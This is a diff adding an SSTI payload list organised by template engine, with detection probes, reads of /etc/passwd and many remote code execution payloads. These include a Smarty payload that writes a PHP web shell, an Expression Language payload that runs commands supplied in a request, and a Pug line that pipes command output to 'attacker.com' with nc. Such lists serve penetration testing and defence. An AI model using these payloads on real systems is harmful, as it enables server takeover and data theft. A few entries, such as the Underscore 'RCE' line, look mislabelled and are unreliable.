@@ -1,0 +1,310 @@
+# Server-Side Template Injection (SSTI) Payloads
+
+# Detection/Polyglot payloads
+${{<%[%'"}}%\
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+
+# Jinja2 (Python - Flask)
+# Basic detection
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{self}}
+
+# Information disclosure
+{{config.items()}}
+{{self.__dict__}}
+{{request.environ}}
+{{request.application.__globals__}}
+
+# File read
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+
+# Remote code execution
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('whoami').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os').popen('ls').read()}}
+{{lipsum.__globals__['os'].popen('whoami').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+
+# Jinja2 sandbox escape
+{{''.__class__.__base__.__subclasses__()}}
+{{[].__class__.__base__.__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# Twig (PHP)
+# Basic detection
+{{7*7}}
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+
+# Information disclosure
+{{_self.env.getGlobals()}}
+{{_self.env}}
+{{dump(_context)}}
+
+# Remote code execution
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['id']|map('passthru')|join}}
+{{['whoami']|map('system')|join}}
+{{'a'.toUpperCase()}}
+{{1*1}}{{6*6}}
+
+# Freemarker (Java)
+# Basic detection
+${7*7}
+#{7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
+
+# Remote code execution
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
+<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder","id").start()}
+${"freemarker.template.utility.Execute"?new()("id")}
+
+# Information disclosure
+${.data_model}
+${.globals}
+${.main}
+${.namespace}
+${.current_namespace}
+${.vars}
+
+# Velocity (Java)
+# Basic detection
+#set($x=7*7)$x
+${{7*7}}
+
+# Remote code execution
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+#set($null=$ex.waitFor())
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+#set($x='')##
+#set($rt=$x.class.forName('java.lang.Runtime'))##
+#set($chr=$x.class.forName('java.lang.Character'))##
+#set($str=$x.class.forName('java.lang.String'))##
+#set($ex=$rt.getRuntime().exec('id'))##
+$ex.waitFor()
+#set($out=$ex.getInputStream())##
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+# Smarty (PHP)
+# Basic detection
+{$smarty.version}
+{php}echo `id`;{/php}
+{7*7}
+
+# Remote code execution
+{system('ls')}
+{system('cat /etc/passwd')}
+{php}system('id');{/php}
+{php}phpinfo();{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+# Information disclosure
+{$smarty.template}
+{$smarty.current_dir}
+{$smarty.template_dir}
+
+# Pug/Jade (Node.js)
+# Basic detection
+#{7*7}
+!{7*7}
+
+# Remote code execution
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('whoami')}()}
+#{global.process.mainModule.require('child_process').exec('id')}
+#{global.process.mainModule.require('child_process').execSync('id').toString()}
+- var x = root.process
+- x = x.mainModule.require
+- x = x('child_process')
+= x.exec('id | nc attacker.com 8080')
+
+# ERB (Ruby on Rails)
+# Basic detection
+<%= 7*7 %>
+<%= system('whoami') %>
+
+# Remote code execution
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').readlines() %>
+<%= require 'open3' %><%= Open3.capture2("id")[0] %>
+<%= File.open('/etc/passwd').read %>
+
+# Thymeleaf (Java)
+# Basic detection
+[[${7*7}]]
+[(${7*7})]
+[# th:block th:each="i : ${#numbers.sequence(1, 7*7)}" /]
+
+# Remote code execution (with SpringEL)
+${T(java.lang.Runtime).getRuntime().exec('calc')}
+*{T(java.lang.Runtime).getRuntime().exec('calc')}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+
+# Tornado (Python)
+# Basic detection
+{{7*7}}
+{% import os %}{{os.popen("id").read()}}
+
+# Remote code execution
+{% import subprocess %}{{subprocess.check_output('id',shell=True)}}
+{% import os %}{{os.system('whoami')}}
+
+# Mako (Python)
+# Basic detection
+${7*7}
+<%={{7*7}%>
+
+# Remote code execution
+<%import os%>${os.popen("id").read()}
+${__import__('os').popen('id').read()}
+
+# Django (Python)
+# Basic detection
+{{7*7}}
+{% debug %}
+
+# Limited RCE (usually sandboxed)
+{{request.META}}
+{{settings.SECRET_KEY}}
+
+# Handlebars (Node.js)
+# Basic detection
+{{7*7}}
+{{this}}
+
+# Prototype pollution
+{{#with "constructor"}}{{#with split as |a|}}{{pop (push "alert('XSS')")}}{{#with .}}{{#with (concat (lookup join (slice 0 1)))}}{{#each .}}{{#with (string.sub.call ../sub "constructor")}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+
+# Groovy (Java)
+# Basic detection
+${7*7}
+<%= 7*7 %>
+
+# Remote code execution
+${"".getClass().forName("java.lang.Runtime").getRuntime().exec("calc")}
+
+# Dot (JavaScript)
+# Basic detection
+{{=7*7}}
+
+# Remote code execution
+{{= global.process.mainModule.require('child_process').execSync('id').toString() }}
+
+# Nunjucks (JavaScript)
+# Basic detection
+{{7*7}}
+{{foo}}
+
+# Remote code execution
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+
+# Razor (.NET)
+# Basic detection
+@(7*7)
+@{7*7}
+
+# Information disclosure
+@System.Diagnostics.Process.GetCurrentProcess().Id
+@Directory.GetFiles("C:\\")
+
+# EJS (JavaScript)
+# Basic detection
+<%=7*7%>
+
+# Remote code execution
+<%=global.process.mainModule.require('child_process').execSync('id')%>
+
+# Underscore/Lodash templates (JavaScript)
+# Basic detection
+<%=7*7%>
+
+# Remote code execution
+<%= _.template('test')() %>
+
+# Marko (JavaScript)
+# Basic detection
+${7*7}
+
+# Remote code execution
+${console.log(global.process.mainModule.require('child_process').execSync('id').toString())}
+
+# Plate (Rust)
+# Basic detection
+{{7*7}}
+
+# Liquid (Ruby)
+# Basic detection
+{{7 | times: 7}}
+
+# Scalate (Scala)
+# Basic detection
+${7*7}
+<%=7*7%>
+
+# Template.js
+# Basic detection
+{{7*7}}
+
+# Trim (Java)
+# Basic detection
+${7*7}
+
+# Jade/Pug continued (with more variants)
+- var x = global.process.mainModule.require
+!{x('child_process').execSync('cat /etc/passwd')}
+
+# ColdFusion
+# Basic detection
+#7*7#
+
+# ASP.NET Web Forms
+# Basic detection
+<%= 7*7 %>
+
+# Expression Language (Java EE)
+# Basic detection
+${7*7}
+#{7*7}
+
+# Remote code execution
+${pageContext.request.getSession().setAttribute("shell","".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(request.getParameter("cmd")))}
+
+# Generic testing payloads
+{{self}}
+${self}
+<%= self %>
+#{self}
+*{self}
+@{self}
+{{constructor}}
+{{__class__}}
+{{__init__}}
+{{__globals__}}
+{{__import__}}
+
+# Blind SSTI detection
+a{{9999*9999}}b
+a${9999*9999}b
+a<%= 9999*9999 %>b
